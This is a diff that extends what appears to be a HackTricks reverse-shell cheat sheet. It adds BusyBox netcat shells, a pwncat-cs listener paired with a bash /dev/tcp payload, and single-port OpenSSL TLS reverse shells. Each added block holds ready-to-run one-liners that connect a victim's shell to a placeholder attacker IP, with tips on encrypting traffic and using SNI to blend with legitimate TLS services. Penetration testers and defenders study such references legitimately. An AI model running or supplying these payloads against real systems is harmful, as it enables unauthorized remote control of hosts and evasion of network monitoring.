@@ -111,6 +111,22 @@ nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
 rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
 ```
 
+## BusyBox
+
+Very common in **routers**, **embedded devices**, **containers**, and stripped-down Linux appliances. If there is no standalone `nc`, check whether BusyBox exposes it:
+
+```bash
+busybox --list-full | grep -E '(^|/)nc$'
+busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
+busybox nc <ATTACKER-IP> <PORT> -e sh
+```
+
+If `busybox nc` exists but interactive execution is flaky, the FIFO pattern from the `nc` section usually still works:
+
+```bash
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
+```
+
 ## gsocket
 
 Check it in [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
@@ -283,6 +299,21 @@ Features:
 - `-s` to spawn any binary (e.g. `/bin/sh`, `python3`) on the victim
 - `--up` to automatically upgrade to a fully interactive PTY
 
+## pwncat-cs
+
+If you already have **any raw reverse shell** but want a listener that automatically tries to upgrade it into a more usable session, `pwncat-cs` is a good modern replacement for a plain `nc -lvnp` listener.
+
+```bash
+# Attacker - catch a plain reverse shell and auto-upgrade it when possible
+python3 -m pip install --user pwncat-cs
+pwncat-cs -lp 4444
+
+# Victim - reuse any payload from this page
+bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
+```
+
+It also supports **encrypted** `ssl-bind` and `ssl-connect` channels, so you can pair it with `ncat --ssl` or `socat OPENSSL:` payloads when you need transport encryption.
+
 ## revsh (encrypted & pivot-ready)
 
 `revsh` is a tiny C client/server that provides a full TTY over an **encrypted Diffie-Hellman tunnel** and can optionally attach a **TUN/TAP** interface for reverse VPN-like pivoting.
@@ -307,15 +338,26 @@ Because the entire session is encrypted and multiplexed, it often bypasses simpl
 
 ## OpenSSL
 
+A **single-port encrypted reverse shell** is usually more practical than the classic two-listener pattern because it is easier to proxy through `443` and simpler to automate.
+
 The Attacker (Kali)
 
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
-openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
-openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
+openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
 ```
 
 The Victim
+
+```bash
+#Linux - one-port TLS shell using a named pipe
+mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
+
+#If the target needs SNI / hostname validation to blend with a fronted TLS service
+mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
+```
+
+You can still use the classic **two-listener** pattern when you want separated input/output channels:
 
 ```bash
 #Linux
@@ -428,5 +470,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 - [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
 - [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
+- [https://github.com/calebstewart/pwncat](https://github.com/calebstewart/pwncat)
+- [https://gtfobins.org/gtfobins/busybox/](https://gtfobins.org/gtfobins/busybox/)
 
 {{#include ../../banners/hacktricks-training.md}}
